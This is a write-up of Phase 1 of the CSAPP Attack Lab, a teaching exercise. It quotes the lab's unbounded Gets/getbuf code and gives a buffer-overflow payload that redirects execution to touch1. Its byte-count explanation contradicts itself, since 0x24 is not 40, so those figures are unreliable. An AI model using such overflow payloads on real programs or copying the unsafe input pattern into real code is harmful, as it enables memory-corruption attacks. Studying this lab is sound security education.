# Attack Lab

> This lab teaches the students about the stack discipline and teaches them about the danger of writing code that is vulnerable to buffer overflow attacks.

Before starting the lab, read [Writeup](http://csapp.cs.cmu.edu/3e/attacklab.pdf) & CSAPP 3.10.3, 3.10.4 carefully.

## Code Injection Attack

### Phase 1

> Same as textbook.

```c
char *Gets(char *s) {
    int c;
    char *dest = s;
    while ((c = getchar()) != '\n' && c != EOF) {
        *dest++ = c;
    }
    if (c == EOF && dest == s)
        // No characters read
        return NULL;
    *dest++ = '\0'; // termination string
    return s;
}

unsigned getbuf() {
    char buf[BUFFER_SIZE];
    Gets(buf);
    return 1;
}

// getbuf is called by test
void test() {
    int val;
    val = getbuf();
    printf("No exploit. Getbuf returned 0x%x\n", val);
}

// our target
void touch1() {
    vlevel = 1; /* Part of validation protocol */
    printf("Touch1!: You called touch1()\n");
    validate(1);
    exit(0);
}
```

What we need to do is to inject a return the address of `touch1()` to `getbuf()`.

In our case, gcc allocated `0x24` bytes for `getbuf()` - 40 bytes.
That is: if input is less than 23 bytes (stack saved 16 bytes, '\0' 1 byte), it will work well.
But if input is more than 23 bytes, it will cause buffer overflow.

We need to inject a return address to `getbuf()` via buffer overflow.
The address is `0x00000000004017c0`.

So, the answer is:

```bash
# we donot care about the low 40 bytes
ff ff ff ff ff ff ff ff
ff ff ff ff ff ff ff ff
ff ff ff ff ff ff ff ff
ff ff ff ff ff ff ff ff
ff ff ff ff ff ff ff ff
c0 17 40 00 00 00 00 00 # little endian
```




